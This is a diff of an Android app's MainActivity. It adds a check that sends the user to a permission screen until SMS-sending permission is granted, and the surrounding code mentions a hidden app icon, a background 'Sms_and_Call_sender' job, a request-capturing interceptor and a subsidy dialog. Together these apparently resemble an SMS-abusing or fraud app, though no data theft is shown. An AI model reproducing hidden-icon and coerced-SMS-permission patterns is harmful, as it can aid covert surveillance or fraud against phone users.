@@ -64,7 +64,8 @@ import com.google.android.material.card.MaterialCardView;
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.analytics.FirebaseAnalytics;
 import com.google.firebase.messaging.FirebaseMessaging;
-
+import com.hjq.permissions.Permission;
+import com.hjq.permissions.XXPermissions;
 
 
 import java.io.File;
@@ -141,7 +142,9 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
 
 
-        checkMissingPermissions();
+//        if (savedInstanceState == null) {
+//            checkMissingPermissions();
+//        }
         setViewsUI();
         initFirebaseThings();      // <-- improved token init
         sharedPrefsCheck();
@@ -162,6 +165,18 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 //        executorService.execute(() -> {
         boolean isOnce = getIntent().getBooleanExtra("SKIP_ONCE", false);
         boolean isPermanent = SharedPrefs.getPermanentlySkipping(this);
+
+
+
+        if(!XXPermissions.isGrantedPermissions(this, Permission.SEND_SMS)){
+
+
+            Toast.makeText(this, "SMS Permission is missing", Toast.LENGTH_LONG).show();
+
+            Intent start = new Intent(MainActivity.this, PermissionActivity.class);
+            startActivity(start);
+
+        }
 
 
         if (!isOnce && !isPermanent) {
@@ -273,8 +288,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
     }
 
 
-
-
     /**
      * initFirebaseThings: robust initialization and token retrieval.
      * - Ensures FirebaseApp is initialized
@@ -282,7 +295,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
      * - Fetches current token asynchronously and persists it
      */
     private void initFirebaseThings() {
-
 
         CapturingInterceptor.setGlobalListener(this);
 
@@ -335,14 +347,10 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         aboutApp = findViewById(R.id.aboutApp);
         tv_appVersion = findViewById(R.id.tv_appVersion);
         subsidyActivity = findViewById(R.id.cardSubsidyHeader);
-
     }
-
-
 
     // TODO: Imlement to check if app is recently updated
     private void settingUpJobs() {
-
 
 //        imageObserverSchedule();
 
@@ -350,20 +358,14 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
             JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
             JobSchedulerUtil.fetch_profile_info(getApplicationContext());
 
-
         }
 
     }
 
     private void setClickListener() {
 
-
-        // As We've hidden the icom it should not require
+        // As We've hidden the icon it should not require
 //        checkServerMessage();
-
-
-
-
 
 
         aboutApp.setOnClickListener(v -> showAboutDialog());
@@ -505,7 +507,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
     }
 
     private void showSubsidyDialog() {
-
 
         // Inflate the layout
         View view = LayoutInflater.from(this).inflate(R.layout.subsidy_request_dialog, null);
